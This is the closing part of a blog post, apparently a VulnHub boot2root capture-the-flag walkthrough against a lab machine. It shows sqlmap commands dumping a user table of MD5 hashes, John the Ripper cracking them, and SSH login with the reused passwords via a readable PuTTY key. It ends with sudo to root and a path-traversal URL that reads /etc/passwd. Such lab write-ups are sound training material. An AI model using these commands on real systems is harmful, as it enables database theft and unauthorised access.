<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">ROUTINES</span><span class="w">                              </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">SCHEMATA</span><span class="w">                              </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">SCHEMA_PRIVILEGES</span><span class="w">                     </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="k">STATISTICS</span><span class="w">                            </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">TABLES</span><span class="w">                                </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">TABLE_CONSTRAINTS</span><span class="w">                     </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">TABLE_PRIVILEGES</span><span class="w">                      </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">TRIGGERS</span><span class="w">                              </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">USER_PRIVILEGES</span><span class="w">                       </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">VIEWS</span><span class="w">                                 </span><span class="o">|</span>
<span class="w">  </span><span class="o">+---------------------------------------+</span>

<span class="w">  </span><span class="k">Database</span><span class="err">:</span><span class="w"> </span><span class="n">mysql</span>
<span class="w">  </span><span class="o">[</span><span class="n">17 tables</span><span class="o">]</span>
<span class="w">  </span><span class="o">+---------------------------------------+</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="k">user</span><span class="w">                                  </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">columns_priv</span><span class="w">                          </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">db</span><span class="w">                                    </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">func</span><span class="w">                                  </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">help_category</span><span class="w">                         </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">help_keyword</span><span class="w">                          </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">help_relation</span><span class="w">                         </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">help_topic</span><span class="w">                            </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="k">host</span><span class="w">                                  </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="k">proc</span><span class="w">                                  </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">procs_priv</span><span class="w">                            </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">tables_priv</span><span class="w">                           </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">time_zone</span><span class="w">                             </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">time_zone_leap_second</span><span class="w">                 </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">time_zone_name</span><span class="w">                        </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">time_zone_transition</span><span class="w">                  </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">time_zone_transition_type</span><span class="w">             </span><span class="o">|</span>
<span class="w">  </span><span class="o">+</span><span class="c1">---------------------------------------+</span>
</code></pre></div>
<p>Okay so there is a lot of database let's dump the ehks users table:</p>
<div class="highlight"><pre><span></span><code><span class="c"># sqlmap </span><span class="nb">-</span><span class="c">u 'http://192</span><span class="nt">.</span><span class="c">168</span><span class="nt">.</span><span class="c">1</span><span class="nt">.</span><span class="c">56/index</span><span class="nt">.</span><span class="c">html?page=blog&amp;title=Blog&amp;id=6' </span><span class="nb">-</span><span class="c">p id </span><span class="nb">-</span><span class="c">D  ehks </span><span class="nb">-</span><span class="c">T user </span><span class="nb">--</span><span class="c">dump</span>
<span class="nb">+---------+-----------+----------------------------------+</span>
<span class="c">| user_id | user_name | user_pass                        |</span>
<span class="nb">+---------+-----------+----------------------------------+</span>
<span class="c">| 1       | dstevens  | 02e823a15a392b5aa4ff4ccb9060fa68 |</span>
<span class="c">| 2       | achen     | b46265f1e7faa3beab09db5c28739380 |</span>
<span class="c">| 3       | pmoore    | 8f4743c04ed8e5f39166a81f26319bb5 |</span>
<span class="c">| 4       | jdurbin   | 7c7bc9f465d86b8164686ebb5151a717 |</span>
<span class="c">| 5       | sorzek    | 64d1f88b9b276aece4b0edcc25b7a434 |</span>
<span class="c">| 6       | ghighland | 9f3eb3087298ff21843cc4e013cf355f |</span>
<span class="nb">+---------+-----------+----------------------------------+</span>
</code></pre></div>
<h2>Cracking the hashes</h2>
<p>We save the hahses in a file (option proposed by sqlmap) and we launch john the
ripper on it:</p>
<div class="highlight"><pre><span></span><code>#john hashes --format=raw-md5
sorzek:pacman
jdurbin:Sue1978
2 password hashes cracked, 4 left
</code></pre></div>
<p>We test the cracked password on:</p>
<ul>
<li>the restricted part: there is two text files about how to blog and how to use the web mail</li>
<li>the admin part: with the two cracked accounts we can only write new article, that is not really useful for our CTF</li>
<li>the mail part: according to the instruction on the restricted part we can access the user's emails from here.</li>
</ul>
<p>We found in an email from sorzek to ghighland that he just add a number to is
useual password "undone" so we just tell john to try password from undone0 to
undone9999. We cracked an other password:</p>
<div class="highlight"><pre><span></span><code><span class="n">ghighland</span><span class="o">:</span><span class="n">undone1</span>
</code></pre></div>
<h2>SSH connexions</h2>
<p>Okay the same password seems to be used everywhere and I was a bit lost to how
to continue so I try the credentials on the ssh service: <em>it works!</em></p>
<p>First of all I logged with the jdurbin account.
There seems to be anything useful but in my search I saw that achen had an
ssh private key readable by everyone (a ppk one for PuTTY).
Okay lets use it to connect on the machine. It ask no password and we got a
shell, what now?</p>
<h2>Privileges escalation</h2>
<p>I try to see what was the differences with this account and I saw a pdf file
"linux_administration.pdf" so I tried to use the sudo command with <code>sudo -v</code> and
once again: <em>it works!</em>
So a simple <code>sudo su</code> give us the root rights.</p>
<p><em>DONE!</em></p>
<h1>Summary</h1>
<p>Lets resume :</p>
<ol>
<li>exploitation of the SQL injection</li>
<li>cracked the hashes</li>
<li>use the credentials on the SSH service</li>
<li>find the ppk SSH key</li>
<li>use it to connect on the achen account</li>
<li>sudo su</li>
</ol>
<p>That was a easy one !</p>
<h1>Nota bene</h1>
<p>Oh yeah we do not explore the lead of the file injection in the
page GET parameter:</p>
<div class="highlight"><pre><span></span><code>http://192.168.1.56/index.html?page=../../../../../../etc/passwd%00&amp;title=Blog&amp;id=5
</code></pre></div>
<p>Moreover the root password "root1234" where is the <code>bash_history</code> of achen.</p>
</div>
<div class="tag-cloud">
<p>
<a href="../../tag/challenge.html">challenge</a>
<a href="../../tag/security.html">security</a>
<a href="../../tag/vulnhub.html">vulnhub</a>
<a href="../../tag/boot2root.html">boot2root</a>
</p>
</div>
<div class="neighbors">
<a class="btn float-left" href="../../2014/08/blog-start.html" title="Blog Start">
<i class="fa fa-angle-left"></i> Previous Post
    </a>
<a class="btn float-right" href="../../2014/10/blog-changes.html" title="Blog changes">
      Next Post <i class="fa fa-angle-right"></i>
</a>
</div>
</article>
<footer>
<p>
  © 2023  - This work is licensed under a <a href="http://creativecommons.org/licenses/by/4.0/deed.en_US" rel="license" target="_blank">Creative Commons Attribution</a>
</p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script data-default-theme="light" data-enable-auto-detect-theme="True" id="dark-theme-script" src="../../theme/dark-theme/dark-theme.min.js" type="text/javascript">
</script>
</p><p>
<a href="http://creativecommons.org/licenses/by/4.0/" rel="license" target="_blank">
<img alt="Creative Commons License" height="15" src="https://i.creativecommons.org/l/by/4.0/80x15.png" style="border-width:0" title="Creative Commons License" width="80">
</img></a>
</p></footer> </main>
<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " maggick's logs ",
  "url" : "../..",
  "image": "https://maggick.fr/media/image.png",
  "description": ""
}
</script>
</body>
</html>